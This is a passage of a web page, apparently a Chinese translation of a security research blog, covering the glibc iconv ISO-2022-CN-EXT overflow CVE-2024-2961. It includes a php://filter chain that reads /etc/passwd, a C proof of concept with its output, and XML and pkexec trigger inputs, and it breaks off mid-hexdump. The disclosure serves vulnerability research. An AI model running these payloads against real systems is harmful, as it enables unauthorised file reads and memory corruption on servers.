,children:"\u57fa\u4e8e\u9519\u8bef\u7684\u9884\u8a00\u673a\u9010\u4e2a\u63d0\u53d6\u5176\u5b57\u8282"}),"\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u4f8b\u5982\uff0c\u8fd9\u91cc\u6709\u4e00\u4e2a\u8fc7\u6ee4\u5668\u94fe\uff0c\u5b83\u9884\u8bbe ",(0,s.jsx)(n.code,{children:"Hello world!"})," \u4e3a ",(0,s.jsx)(n.code,{children:"/etc/passwd"})," \uff1a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|\nconvert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|\nconvert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.IBM860.UTF16|\nconvert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|\nconvert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|\nconvert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|\nconvert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|\nconvert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.JS.UNICODE|\nconvert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|\nconvert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|\nconvert.iconv.855.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|\nconvert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|\nconvert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|\nconvert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|\nconvert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|\nconvert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|\nconvert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|\nconvert.iconv.855.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|\nconvert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L5.UTF-32|\nconvert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|\nconvert.base64-encode|convert.iconv.855.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|\nconvert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.ISO2022KR.UTF16|\nconvert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|\nconvert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|\nconvert.iconv.855.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|\nconvert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|\nconvert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|\nconvert.iconv.855.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|\nconvert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|\nconvert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|\nconvert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|\nconvert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=/etc/passwd\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u7ed3\u679c\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"Hello, world!!!root:x:0:0:root:/root:/bin/bash...\n"})}),"\n",(0,s.jsx)(n.h3,{id:"php-\u8fc7\u6ee4\u5668\u524d\u7f00\u540e\u7f00\u548c-crash",children:"PHP \u8fc7\u6ee4\u5668\uff1a\u524d\u7f00\u3001\u540e\u7f00\u548c crash"}),"\n",(0,s.jsx)(n.p,{children:"\u53ef\u60b2\u7684\u662f\uff0c\u6587\u4ef6\u8bfb\u53d6\u5e76\u4e0d\u603b\u662f\u50cf\u4ee5\u4e0b\u90a3\u6837\u5bb9\u6613\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"echo file_get_contents($_POST['file']);\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u901a\u5e38\uff0c\u6587\u4ef6\u4e0d\u4f1a\u6309\u539f\u6837\u8fd4\u56de\uff0c\u4f46\u4f1a\u4ee5\u67d0\u79cd\u65b9\u5f0f\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u6216\u68c0\u67e5\u3002\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u6211\u7ecf\u5e38\u9047\u5230\u8fd9\u6bb5\u4ee3\u7801\u7684\u53d8\u4f53\uff0c\u5b83\u8981\u6c42\u4f60\u7684\u6587\u4ef6\u662f\u6709\u6548\u7684 JSON\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"$data = file_get_contents($_POST['url']);\n$data = json_decode($data);\necho $data->message;\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u6211\u4eec\u5728\u8fd9\u91cc\u8bfb\u53d6\u4e86\u4e00\u4e2a\u6587\u4ef6\uff0c\u4f46\u5185\u5bb9\u968f\u540e\u88ab JSON \u53cd\u5e8f\u5217\u5316\uff0c\u5e76\u4e14\u53ea\u8fd4\u56de\u6587\u6863\u7684\u4e00\u90e8\u5206\u3002\u4e3a\u4e86\u8bfb\u53d6\u6807\u51c6\u6587\u4ef6\uff0c\u4f8b\u5982 ",(0,s.jsx)(n.code,{children:"/etc/passwd"})," \uff0c\u6211\u4eec\u9700\u8981\u5411\u6d41\u6dfb\u52a0\u4efb\u610f\u524d\u7f00\u548c\u540e\u7f00\u3002\u50cf\u8fd9\u6837\uff1a ",(0,s.jsx)(n.code,{children:'{"message": "<contents-of-/etc/passwd>"}'})," .\u5728 2023 \u5e74\u5e95\uff0c\u60c5\u51b5\u662f\u60a8\u53ef\u4ee5\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"php://filter"})," \u94fe\u4e3a\u6d41\u6dfb\u52a0\u524d\u7f00\uff0c\u4f46\u4e0d\u80fd\u6dfb\u52a0\u540e\u7f00\u3002\u56e0\u6b64\uff0c\u6211\u5f00\u59cb\u7814\u7a76\u4e00\u79cd\u7b97\u6cd5\u6765\u505a\u540e\u8005\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u5f53\u65f6\uff0c\u6211\u5bf9\u5b57\u7b26\u96c6\u6216\u7f16\u7801\u4e00\u65e0\u6240\u77e5\uff08\u8001\u5b9e\u8bf4\uff0c\u6211\u4ecd\u7136\u4e0d\u77e5\u9053\u5176\u4e2d\u7684\u533a\u522b\uff09\u3002\u9996\u5148\uff0c\u6211\u6784\u5efa\u4e86\u4e00\u4e2a\u66b4\u529b\u7834\u89e3\u811a\u672c\uff0c\u8be5\u811a\u672c\u5c06\u51e0\u4e2a ",(0,s.jsx)(n.code,{children:"iconv"})," \u8fc7\u6ee4\u5668\u5806\u53e0\u5728\u4e00\u8d77\uff0c\u5e76\u663e\u793a\u7ed3\u679c\u3002\u50cf\u8fd9\u6837\uff1a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"php://filter/convert.iconv.A.B/convert.iconv.C.D/convert.iconv.E.F/resource=data:,test123\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5728\u67d0\u4e2a\u65f6\u5019\uff0c\u6211\u7684\u201c\u6a21\u7cca\u5668\u201d\u5d29\u6e83\u4e86\u3002\n\u6211\u4e00\u751f\u4e2d\u5927\u90e8\u5206\u65f6\u95f4\u90fd\u5728\u4e0ePHP\u6253\u4ea4\u9053\uff0c\u6211\u5f88\u5feb\u5c31\u6307\u624b\u753b\u811a\u3002\u4f46\u6211\u4e0d\u77e5\u9053\u7684\u662f\uff0c\u8fd9\u4e2a\u9519\u8bef\u5728\u8c03\u7528\u94fe\u4e2d\u7684\u4f4d\u7f6e\u8981\u4f4e\u5f97\u591a\uff1a\u4e00\u76f4\u5230glibc\u3002"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsxs)(n.em,{children:["\u6ce8\u610f\uff1a\u8be5\u7814\u7a76\u4ea7\u751f\u4e86\u4e00\u4e2a\u4e8e 2023 \u5e74 12 \u6708\u53d1\u5e03\u7684\u5de5\u5177\uff1a",(0,s.jsx)(n.a,{href:"https://www.ambionics.io/blog/wrapwrap-php-filters-suffix",children:"wrapwrap"}),".\u3002"]})}),"\n",(0,s.jsx)(n.h2,{id:"glibc-\u4e2d\u5b58\u5728\u4e00\u4e2a\u9519\u8befcve-2024-2961",children:"Glibc \u4e2d\u5b58\u5728\u4e00\u4e2a\u9519\u8befCVE-2024-2961"}),"\n",(0,s.jsxs)(n.h3,{id:"the-iconv-api",children:["The ",(0,s.jsx)(n.code,{children:"iconv()"})," API"]}),"\n",(0,s.jsx)(n.p,{children:"\u5f53PHP\u4ece\u4e00\u4e2a\u5b57\u7b26\u96c6\u8f6c\u6362\u4e3a\u53e6\u4e00\u4e2a\u5b57\u7b26\u96c6\u65f6\uff0c\u5b83\u4f7f\u7528iconv\uff0c\u8fd9\u662f\u4e00\u4e2aAPI\uff0c\u201c\u4f7f\u7528\u8f6c\u6362\u63cf\u8ff0\u7b26\u5c06\u8f93\u5165\u7f13\u51b2\u533a\u4e2d\u7684\u5b57\u7b26\u8f6c\u6362\u4e3a\u8f93\u51fa\u7f13\u51b2\u533a\u201d\u3002\u5728 Linux \u4e0a\uff0c\u6b64 API \u7531 glibc \u5b9e\u73b0\u3002"}),"\n",(0,s.jsx)(n.p,{children:"API \u975e\u5e38\u7b80\u5355\u3002\u9996\u5148\u6253\u5f00\u4e00\u4e2a\u8f6c\u6362\u63cf\u8ff0\u7b26\uff0c\u8be5\u63cf\u8ff0\u7b26\u6307\u793a\u8f93\u5165\u548c\u8f93\u51fa\u5b57\u7b26\u96c6\u3002"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"iconv_t iconv_open(const char *tocode, const char *fromcode);\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u7136\u540e\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"iconv()"})," \u5c06\u8f93\u5165\u7f13\u51b2\u533a ",(0,s.jsx)(n.code,{children:"inbuf"})," \u8f6c\u6362\u4e3a\u8f93\u51fa\u7f13\u51b2\u533a\u4e2d ",(0,s.jsx)(n.code,{children:"outbuf"})," \u7684\u65b0\u5b57\u7b26\u96c6\u3002"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"size_t iconv(iconv_t cd,\n            char **restrict inbuf, size_t *restrict inbytesleft,\n            char **restrict outbuf, size_t *restrict outbytesleft);\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u7f13\u51b2\u533a\u7ba1\u7406\u7531\u8c03\u7528\u65b9\u8d1f\u8d23\u3002\u5982\u679c\u8f93\u51fa\u7f13\u51b2\u533a\u4e0d\u591f\u5927\uff0c ",(0,s.jsx)(n.code,{children:"iconv()"})," \u5c06\u8fd4\u56de\u4e00\u4e2a\u9519\u8bef\uff0c\u6307\u793a\u5982\u6b64\uff0c\u60a8\u5c06\u80fd\u591f\u901a\u8fc7\u518d\u6b21\u8c03\u7528 ",(0,s.jsx)(n.code,{children:"iconv()"})," \u91cd\u65b0\u5206\u914d ",(0,s.jsx)(n.code,{children:"outbuf"})," \u5e76\u7ee7\u7eed\u8f6c\u6362\u3002\u8be5\u51fd\u6570\u4fdd\u8bc1\u7684\u662f\uff0c\u5b83\u6c38\u8fdc\u4e0d\u4f1a\u4ece ",(0,s.jsx)(n.code,{children:"inbuf"})," \u4e2d\u8bfb\u53d6\u8d85\u8fc7 ",(0,s.jsx)(n.code,{children:"inbytesleft"})," \u5b57\u8282\u7684\u5b57\u8282\u6570\uff0c\u4e5f\u4e0d\u4f1a\u5411 ",(0,s.jsx)(n.code,{children:"outbuf"})," \u5199\u5165\u8d85\u8fc7 ",(0,s.jsx)(n.code,{children:"outbytesleft"})," \u5b57\u8282\u6570\u7684\u5b57\u8282\u6570\u3002\u4ece\u4e0d\uff1f\u597d\u5427\uff0c\u7406\u8bba\u4e0a......"]}),"\n",(0,s.jsx)(n.h3,{id:"\u8f6c\u6362\u4e3a-iso-2022-cn-ext-\u65f6\u51fa\u754c\u5199\u5165",children:"\u8f6c\u6362\u4e3a ISO-2022-CN-EXT \u65f6\u51fa\u754c\u5199\u5165"}),"\n",(0,s.jsxs)(n.p,{children:["\u78b0\u5de7\u7684\u662f\uff0c\u5728\u5c06\u6570\u636e\u8f6c\u6362\u4e3a ",(0,s.jsx)(n.code,{children:"ISO-2022-CN-EXT"})," \u5b57\u7b26\u96c6\u65f6\uff0ciconv \u53ef\u80fd\u65e0\u6cd5\u5728\u5199\u5165\u8f93\u51fa\u7f13\u51b2\u533a\u4e4b\u524d\u68c0\u67e5\u8f93\u51fa\u7f13\u51b2\u533a\u4e2d\u662f\u5426\u6709\u8db3\u591f\u7684\u7a7a\u95f4\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u5b9e\u9645\u4e0a\uff0c ",(0,s.jsx)(n.code,{children:"ISO-2022-CN-EXT"})," \u5b83\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u5b57\u7b26\u96c6\u7684\u96c6\u5408\uff1a\u5f53\u5b83\u9700\u8981\u5bf9\u5b57\u7b26\u8fdb\u884c\u7f16\u7801\u65f6\uff0c\u5b83\u4f1a\u9009\u62e9\u9002\u5f53\u7684\u5b57\u7b26\u96c6\uff0c\u5e76\u53d1\u51fa\u4e00\u4e2a\u8f6c\u4e49\u5e8f\u5217\uff0c\u6307\u793a\u89e3\u7801\u5668\u9700\u8981\u5207\u6362\u5230\u8fd9\u6837\u7684\u5b57\u7b26\u96c6\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u4e0b\u9762\u7684\u4ee3\u7801\u662f\u8d1f\u8d23\u53d1\u51fa\u6b64\u7c7b\u8f6c\u4e49\u5e8f\u5217\u7684\u90e8\u5206\u3002\u5b83\u7531 3 ",(0,s.jsx)(n.code,{children:"if"})," \u4e2a\u5757\u7ec4\u6210\uff0c\u6bcf\u4e2a\u5757\u5c06\u4e0d\u540c\u7684\u8f6c\u4e49\u5e8f\u5217\u5199\u5165 ",(0,s.jsx)(n.code,{children:"outbuf"})," \uff08\u6307\u5411\uff09\u3002 ",(0,s.jsx)(n.code,{children:"outptr"})," \u5982\u679c\u4f60\u770b\u4e00\u4e0b\u7b2c\u4e00\u4e2a [1] \uff0c\u4f60\u53ef\u4ee5\u770b\u5230\u5b83\u4ee5\u53e6\u4e00\u4e2a ",(0,s.jsx)(n.code,{children:"if()"})," \u5757\u4e3a\u524d\u7f00\uff0c\u8be5\u5757\u68c0\u67e5\u8f93\u51fa\u7f13\u51b2\u533a\u662f\u5426\u8db3\u591f\u5927\u4ee5\u5bb9\u7eb3 4 \u4e2a\u5b57\u7b26\u3002\u53e6\u5916\u4e24\u4e2a ",(0,s.jsx)(n.code,{children:"if()"})," [2][3] \u5219\u6ca1\u6709\u3002\u56e0\u6b64\uff0c\u8f6c\u4e49\u5e8f\u5217\u53ef\u80fd\u4f1a\u88ab\u5199\u5165\u8d8a\u754c\u3002"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"// iconvdata/iso-2022-cn-ext.c\n\n/* See whether we have to emit an escape sequence.  */\nif (set != used)\n{\n    /* First see whether we announced that we use this\n        character set.  */\n    if ((used & SO_mask) != 0 && (ann & SO_ann) != (used << 8)) // [1]\n    {\n        const char *escseq;\n\n        if (outptr + 4 > outend) // <-------------------- BOUND CHECK\n        {\n            result = __GCONV_FULL_OUTPUT;\n            break;\n        }\n\n        assert(used >= 1 && used <= 4);\n        escseq = \")A\\0\\0)G)E\" + (used - 1) * 2;\n        *outptr++ = ESC;\n        *outptr++ = '$';\n        *outptr++ = *escseq++;\n        *outptr++ = *escseq++;\n\n        ann = (ann & ~SO_ann) | (used << 8);\n    }\n    else if ((used & SS2_mask) != 0 && (ann & SS2_ann) != (used << 8)) // [2]\n    {\n        const char *escseq;\n\n        // <-------------------- NO BOUND CHECK\n\n        assert(used == CNS11643_2_set); /* XXX */\n        escseq = \"*H\";\n        *outptr++ = ESC;\n        *outptr++ = '$';\n        *outptr++ = *escseq++;\n        *outptr++ = *escseq++;\n\n        ann = (ann & ~SS2_ann) | (used << 8);\n    }\n    else if ((used & SS3_mask) != 0 && (ann & SS3_ann) != (used << 8)) // [3]\n    {\n        const char *escseq;\n\n        // <-------------------- NO BOUND CHECK\n\n        assert((used >> 5) >= 3 && (used >> 5) <= 7);\n        escseq = \"+I+J+K+L+M\" + ((used >> 5) - 3) * 2;\n        *outptr++ = ESC;\n        *outptr++ = '$';\n        *outptr++ = *escseq++;\n        *outptr++ = *escseq++;\n\n        ann = (ann & ~SS3_ann) | (used << 8);\n    }\n}\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u8981\u89e6\u53d1 bug\uff0c\u6211\u4eec\u9700\u8981\u5728\u8f93\u51fa\u7f13\u51b2\u533a\u7ed3\u675f\u4e4b\u524d\u5f3a\u5236 ",(0,s.jsx)(n.code,{children:"iconv()"})," \u53d1\u51fa\u8f6c\u4e49\u5e8f\u5217\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5916\u6765\u5b57\u7b26\uff0c\u4f8b\u5982\uff1a ",(0,s.jsx)(n.code,{children:"\u5284"})," \u3001 ",(0,s.jsx)(n.code,{children:"\u409a"})," \u6216 ",(0,s.jsx)(n.code,{children:"\u5cdb"})," ",(0,s.jsx)(n.code,{children:"\u6e7f"})," \u3002\u7ed3\u679c\u662f 1 \u5230 3 \u4e2a\u5b57\u8282\u7684\u6ea2\u51fa\uff0c\u5176\u503c\u5982\u4e0b\uff1a"]}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"$*H"})," [",(0,s.jsx)(n.code,{children:"24 2A 48"}),"]"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"$+I"})," [",(0,s.jsx)(n.code,{children:"24 2B 49"}),"]"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"$+J"})," [",(0,s.jsx)(n.code,{children:"24 2B 4A"}),"]"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"$+K"})," [",(0,s.jsx)(n.code,{children:"24 2B 4B"}),"]"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"$+L"})," [",(0,s.jsx)(n.code,{children:"24 2B 4C"}),"]"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"$+M"})," [",(0,s.jsx)(n.code,{children:"24 2B 4D"}),"]"]}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["\u5feb\u901f",(0,s.jsx)(n.a,{href:"https://github.com/ambionics/cnext-exploits/blob/main/poc.c",children:"POC"})," \u6f14\u793a\u4e86\u8be5\u9519\u8bef\uff1a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'/*\n$ gcc -o poc ./poc.c && ./poc\n*/\n...\n\nvoid hexdump(void *ptr, int buflen)\n{\n    ...\n}\n\nvoid main()\n{\n    iconv_t cd = iconv_open("ISO-2022-CN-EXT", "UTF-8");\n\n    char input[0x10] = "AAAAA\u5284";\n    char output[0x10] = {0};\n\n    char *pinput = input;\n    char *poutput = output;\n\n    // Same size for input and output buffer: 8 bytes\n    size_t sinput = strlen(input);\n    size_t soutput = sinput;\n\n    iconv(cd, &pinput, &sinput, &poutput, &soutput);\n\n    printf("Remaining bytes (should be > 0): %zd\\n", soutput);\n\n    hexdump(output, 0x10);\n}\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u8fd9\u5728\u6613\u53d7\u653b\u51fb\u7684\u7cfb\u7edf\u4e0a\u4ea7\u751f\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"$ gcc -o poc ./poc.c && ./poc\nRemaining bytes (should be > 0): -1\n000000: 41 41 41 41  41 1b 24 2a  48 00 00 00  00 00 00 00    AAAA A.$* H... ....\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5df2\u7ecf\u5199\u4e86\u4e5d\u4e2a\u5b57\u8282\uff0c\u5c3d\u7ba1\u544a\u8bc9 ",(0,s.jsx)(n.code,{children:"iconv()"})," \u6700\u591a\u5199\u516b\u4e2a\u5b57\u8282\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["Checking the ",(0,s.jsx)(n.a,{href:"https://github.com/lattera/glibc/commit/755104edc75c53f4a0e7440334e944ad3c6b32fc#diff-c55a50730dd1a15db405b851229d49697508e27710403e4995f0f9d628295c36",children:"commit history"}),", I noticed that the bug was very old: it appeared in year 2000, making it 24 years old.\n\u68c0\u67e5\u63d0\u4ea4",(0,s.jsx)(n.a,{href:"https://github.com/lattera/glibc/commit/755104edc75c53f4a0e7440334e944ad3c6b32fc#diff-c55a50730dd1a15db405b851229d49697508e27710403e4995f0f9d628295c36",children:"\u5386\u53f2\u8bb0\u5f55"}),"\uff0c\u6211\u6ce8\u610f\u5230\u8fd9\u4e2a\u9519\u8bef\u975e\u5e38\u53e4\u8001\uff1a\u5b83\u51fa\u73b0\u5728 2000 \u5e74\uff0c\u8ddd\u4eca\u5df2\u6709 24 \u5e74\u7684\u5386\u53f2\u3002\n\u73b0\u5728\uff0c\u8fd9\u4e2a\u9519\u8bef\u53ef\u4ee5\u505a\u4ec0\u4e48\uff1f"]}),"\n",(0,s.jsx)(n.h3,{id:"\u6761\u4ef6\u548c\u539f\u59cb",children:"\u6761\u4ef6\u548c\u539f\u59cb"}),"\n",(0,s.jsxs)(n.p,{children:["\u6709\u4e86\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u6211\u6709\u4e00\u4e2a 1 \u5230 3 \u4e2a\u5b57\u8282\u7684\u6ea2\u51fa\uff0c\u5176\u4e2d\u5305\u542b\u975e\u53d7\u63a7\u5b57\u7b26\u3002\u8fd9\u5e76\u4e0d\u591a\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u5148\u51b3\u6761\u4ef6\u3002\u6211\u9700\u8981\u627e\u5230\u4e00\u4e2a\u7535\u8bdd\uff0c ",(0,s.jsx)(n.code,{children:"iconv()"})," \u5176\u4e2d\u6211\uff1a"]}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:["controlled the output charset (",(0,s.jsx)(n.code,{children:"ISO-2022-CN-EXT"}),")\n\u63a7\u5236\u8f93\u51fa\u5b57\u7b26\u96c6 \uff08 ",(0,s.jsx)(n.code,{children:"ISO-2022-CN-EXT"})," \uff09"]}),"\n",(0,s.jsx)(n.li,{children:"controlled part of the input buffer (to put in the beautiful chinese characters)\n\u8f93\u5165\u7f13\u51b2\u533a\u7684\u53d7\u63a7\u90e8\u5206\uff08\u8f93\u5165\u6f02\u4eae\u7684\u6c49\u5b57\uff09"}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["\u8003\u8651\u5230\u8fd9\u4e00\u70b9\uff0c\u6211\u5f00\u59cb\u5bfb\u627e\u76ee\u6807\u3002\u4ece\u5728\u6211\u7684 ",(0,s.jsx)(n.code,{children:"/lib"})," \u76ee\u5f55 ",(0,s.jsx)(n.code,{children:"/bin"})," ",(0,s.jsx)(n.code,{children:"iconv"})," \u4e2d\u5b66\u4e60\u5230\u8fed\u4ee3\u6570\u767e\u4e2a OSS \u9879\u76ee\uff0c\u6211\u53d1\u73b0\u4e86\u4e00\u4e9b\u6709\u8da3\u7684\u76ee\u6807\u3002\u5b9e\u9645\u4e0a\u6ca1\u6709\u4e00\u4e2a\u662f\u53ef\u5229\u7528\u7684\u3002\n\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u8ba9\u6211\u4eec\u770b\u4e00\u4e2a\u975e\u5e38\u6709\u524d\u9014\u7684\u76ee\u6807\uff1a ",(0,s.jsx)(n.code,{children:"libxml2"})," ."]}),"\n",(0,s.jsx)(n.h4,{id:"libxml2\u5b57\u8282\u7684\u6d77\u6d0b",children:"libxml2\uff1a\u5b57\u8282\u7684\u6d77\u6d0b"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"libxml2"})," \u4ec5\u5904\u7406 UTF-8 \u683c\u5f0f\u7684 XML\u3002\u5982\u679c XML \u6587\u6863\u4e0d\u662f UTF-8\uff0c\u5b83\u5c06\u88ab\u8f6c\u6362\u4e3a\u5b83\uff0c\u7136\u540e\u8fdb\u884c\u5904\u7406\uff0c\u7136\u540e\u5728\u5b8c\u6210\u6240\u6709\u64cd\u4f5c\u540e\u8f6c\u6362\u56de\u5176\u539f\u59cb\u5b57\u7b26\u96c6\u3002\u8f6c\u6362\u662f\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"iconv()"})," ."]}),"\n",(0,s.jsx)(n.p,{children:"\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6837\u7684\u6587\u4ef6\u6ee1\u8db3\u6211\u4eec\u7684\u5148\u51b3\u6761\u4ef6\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'<?xml version="1.0" encoding="ISO-2022-CN-EXT"?>\n<root>&21124;</root>\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.em,{children:"\u6ce8\u610f\uff1a21124 \u662f \u5284 \u7684 unicode \u4ee3\u7801\u4f4d\u3002"})}),"\n",(0,s.jsxs)(n.p,{children:["\u73b0\u5728\uff0c\u8bf7\u8bb0\u4f4f\uff1a\u7f13\u51b2\u533a\u7ba1\u7406\u662f\u8c03\u7528\u65b9\u7684\u8d23\u4efb\u3002\u5f53\u7528\u4e8e ",(0,s.jsx)(n.code,{children:"iconv()"})," \u5c06\u6211\u4eec\u7684\u6587\u6863\u8f6c\u6362\u56de\u5176\u539f\u59cb\u5b57\u7b26\u96c6\u65f6 ",(0,s.jsx)(n.code,{children:"libxml2"})," \uff0c\u5b83\u4f1a\u5206\u914d\u4e00\u4e2a\u8f93\u51fa\u7f13\u51b2\u533a\uff0c\u8be5\u7f13\u51b2\u533a\u662f\u8f93\u5165\u7f13\u51b2\u533a\uff08\u4ee3\u7801\uff09\u7684 4 \u500d\u3002\u5bf9\u6211\u4eec\u6765\u8bf4\u592a\u5927\u4e86\uff1a\u6211\u4eec\u65e0\u6cd5\u8fbe\u5230\u7f13\u51b2\u533a\u7684\u8fb9\u754c\u4ee5\u6ea2\u51fa\u3002\u6b7b\u80e1\u540c\u3002"]}),"\n",(0,s.jsx)(n.h4,{id:"pkexec4-\u4e2a\u5b57\u8282\u592a\u591a\u4e86",children:"pkexec\uff1a4 \u4e2a\u5b57\u8282\u592a\u591a\u4e86"}),"\n",(0,s.jsxs)(n.p,{children:["\u53e6\u4e00\u4e2a\u6709\u8da3\u7684\u76ee\u6807\u662f pkexec\uff0c\u4e00\u4e2a\u5b58\u5728\u4e8e\u8bb8\u591a linux \u53d1\u884c\u7248\u4e2d\u7684 setuid \u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u4e8c\u8fdb\u5236\u6587\u4ef6\u5141\u8bb8\u60a8\u901a\u8fc7\u8bbe\u7f6e ",(0,s.jsx)(n.code,{children:"CHARSET"})," \u73af\u5883\u53d8\u91cf\u6765\u4e3a\u5176\u8f93\u51fa\u7684\u6bcf\u6761\u6d88\u606f\u9009\u62e9\u5b57\u7b26\u96c6\u3002\u4f8b\uff1a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"$ CHARSET=ISO-2022-CN-EXT pkexec 'trigger\u5284' 2>&1 | hexyl\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u250200000000\u2502 43 61 6e 6e 6f 74 20 72 \u250a 75 6e 20 70 72 6f 67 72 \u2502Cannot r\u250aun progr\u2502\n\u250200000010\u2502 61 6d 20 74 72 69 67 67 \u250a 65 72 1b 24 2a 48 1b 4e \u2502am 